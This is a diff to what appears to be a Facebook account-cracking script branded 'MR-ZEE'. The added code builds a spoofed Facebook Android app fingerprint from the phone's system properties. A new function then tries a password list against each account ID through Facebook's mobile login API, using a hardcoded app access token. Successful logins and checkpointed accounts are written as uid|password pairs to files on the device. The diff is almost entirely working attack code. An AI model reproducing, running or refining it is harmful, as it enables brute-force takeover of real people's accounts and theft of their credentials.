@@ -134,8 +134,53 @@ for xd in range(10000):
 	l='Mobile Safari/537.36'
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
-awan =[
-'',]
+sim_id = ''
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fblc = 'en_GB'
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+except:
+        fbcr = 'Zong'
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbdv = model
+fbsv = android_version
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+                total+=1
+        select = ('1','2')
+        if select == '1':
+                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+                sim_id+=fbcr
+        elif select == '2':
+                try:
+                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+                        sim_id+=fbcr
+                except Exception as e:
+                        fbcr = "Zong"
+                        sim_id+=fbcr
+        else:
+                fbcr = 'Zong'
+                sim_id+=fbcr
+except:
+        fbcr = "Zong"
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+        'fblc':fblc,
+        'fbmf':fbmf,
+        'fbbd':fbbd,
+        'fbdv':model,
+        'fbsv':fbsv,
+        'fbca':fbca,
+        'fbdm':fbdm}
 logo=("""\033[1;97m
 \x1b[1;92m ________   _______  _______\x1b[1;92m 
 \x1b[1;92m|       /  |   ____||   ____|\x1b[1;92m
@@ -254,7 +299,98 @@ def menu():
 				exit('')
 			else:
 				exit(' Option not found in menu...')
-		
+
+def rndm(ids,passlist):
+        global loop
+        global oks
+        sys.stdout.write('\r\r\033[1;37m [MR-ZEE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':ids,
+                                'password':pas,
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'fb_api_req_friendly_name':'authenticate',
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent':ua,
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                try:
+                                        uid = po['uid']
+                                except:
+                                        uid = ids
+                                if str(uid) in oks:
+                                        break
+                                else:
+                                        print('\r\r\033[1;32m [ZEE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ZEE-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                        print('\r\r\x1b[38;5;208m [ZEE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ZEE-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
 def mmm(ids,names,passlist):
 	global loop,oks,cps
 	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.NOOB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
